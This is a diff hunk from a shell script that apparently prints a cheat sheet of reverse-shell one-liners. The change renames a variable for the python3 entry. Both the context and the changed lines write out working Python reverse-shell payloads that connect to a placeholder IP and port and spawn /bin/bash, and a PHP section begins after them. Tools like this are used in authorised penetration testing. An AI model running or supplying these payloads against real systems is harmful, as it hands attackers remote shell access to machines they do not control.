@@ -172,8 +172,8 @@ PY2=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INE
 printf "$PY2\n"
 printf "
 -py3		"
-PY2=$(echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~[ip]~,[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
-printf "$PY2\n"
+PY3=$(echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((~[ip]~,[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(~/bin/bash~)'" | sed s/\~/\"/g)
+printf "$PY3\n"
 printf "
 php
 -p1		"
